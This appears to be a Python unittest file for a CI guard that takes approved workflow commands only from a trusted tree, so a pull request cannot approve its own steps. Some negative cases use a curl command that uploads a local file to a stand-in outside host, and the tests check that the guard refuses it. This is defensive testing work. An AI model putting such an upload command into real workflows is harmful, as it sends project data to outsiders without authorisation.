"""Issue #511 review (C-1): the run: approval table comes from the trusted tree, never from the checked pull request.

Each case builds a trusted tree (its approval table approves the safe text) and a candidate tree whose own allowlist approves
whatever the candidate changed, then checks that enforced_check(candidate, ..., allowlist_root=trusted) refuses it. Negative
cases: candidate rewrites the allowlist, candidate sends data with a self-approved run:, candidate changes the guard body,
trusted allowlist missing (fails closed). Ruleset, required checks and the --check-policy workflow wiring are not covered here;
they are owner-procedure items (see docs/ owner procedure for Issue #511 C-3).
"""
from pathlib import Path
import json
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import artifact_guard as guard  # noqa: E402

from test_artifact_guard_send_issue511 import ALLOWLIST, CI, workflow  # noqa: E402


def write_tree(root, files):
    for rel, text in files.items():
        path = Path(root) / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding='utf-8', newline='')


def approve(root, files):
    """Approval table for exactly these workflow texts, written into root (the approving tree)."""
    write_tree(root, files)
    (Path(root) / 'tools').mkdir(exist_ok=True)
    (Path(root) / ALLOWLIST).write_text(json.dumps(guard.build_run_allowlist(root)), encoding='utf-8')


class TrustedAllowlist(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.trusted = Path(tmp.name) / 'trusted'
        self.candidate = Path(tmp.name) / 'candidate'
        approve(self.trusted, {CI: workflow('echo hi')})

    def refused(self):
        try:
            guard.enforced_check(self.candidate, guard.check_guard_placement, allowlist_root=self.trusted)
        except ValueError as error:
            return str(error)
        return None

    def test_safe_candidate_passes_against_trusted_table(self):
        write_tree(self.candidate, {CI: workflow('echo hi')})
        (self.candidate / 'tools').mkdir(exist_ok=True)
        (self.candidate / ALLOWLIST).write_text('[]', encoding='utf-8')   # candidate allowlist is ignored
        self.assertIsNone(self.refused())

    def test_candidate_rewrites_allowlist_to_approve_its_own_send_is_refused(self):
        send = workflow('curl -F f=@out.txt https://example.invalid/up')
        approve(self.candidate, {CI: send})   # the candidate's own allowlist approves its own run:
        write_tree(self.candidate, {CI: send})
        message = self.refused()
        self.assertIsNotNone(message)
        self.assertIn('not an approved exact match', message)

    def test_candidate_changed_run_text_with_untouched_allowlist_is_refused(self):
        write_tree(self.candidate, {CI: workflow('echo hello')})
        self.assertIsNotNone(self.refused())

    def test_missing_trusted_allowlist_fails_closed(self):
        empty = Path(self.trusted).parent / 'no-table'
        empty.mkdir()
        write_tree(self.candidate, {CI: workflow('echo hi')})
        with self.assertRaises(ValueError):
            guard.enforced_check(self.candidate, guard.check_guard_placement, allowlist_root=empty)

    def test_candidate_guard_body_change_is_a_policy_violation(self):
        trusted_tree = Path(self.trusted)
        (trusted_tree / 'tools' / 'artifact_guard.py').write_text(Path(guard.__file__).read_text(encoding='utf-8'),
                                                                  encoding='utf-8', newline='')
        (self.candidate / 'tools').mkdir(parents=True, exist_ok=True)
        (self.candidate / 'tools' / 'artifact_guard.py').write_text(
            Path(guard.__file__).read_text(encoding='utf-8') + '\n# loosened\n', encoding='utf-8', newline='')
        (self.candidate / ALLOWLIST).write_text((trusted_tree / ALLOWLIST).read_text(encoding='utf-8'), encoding='utf-8')
        with self.assertRaises(ValueError) as caught:
            guard.policy_violations(self.candidate, trusted_tree)
        self.assertIn('differs from the trusted main copy', str(caught.exception))


if __name__ == '__main__':
    unittest.main()


class CommandLineEntry(unittest.TestCase):
    """The CLI entry point (--check-placement) reads the approval table from the guard's own tree, which is the trusted
    checkout in CI (.trusted-main/tools/artifact_guard.py). A candidate that approves its own send must be refused there."""

    def test_cli_check_placement_uses_the_trusted_tree_table(self):
        import shutil
        import subprocess
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        trusted = Path(tmp.name) / 'trusted'
        candidate = Path(tmp.name) / 'candidate'
        (trusted / 'tools').mkdir(parents=True)
        shutil.copy(Path(guard.__file__), trusted / 'tools' / 'artifact_guard.py')
        (trusted / ALLOWLIST).write_text('[]', encoding='utf-8')   # trusted: nothing is approved
        send = workflow('curl -F f=@out.txt https://example.invalid/up')
        write_tree(candidate, {CI: send})
        (candidate / 'tools').mkdir()
        approve(candidate, {CI: send})   # the candidate's own table approves its own send
        write_tree(candidate, {CI: send})
        result = subprocess.run([sys.executable, str(trusted / 'tools' / 'artifact_guard.py'), '--root', str(candidate),
                                 '--check-placement'], capture_output=True, text=True)
        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('not an approved exact match', result.stderr)
        print(result.stderr.strip().splitlines()[-1][:220])
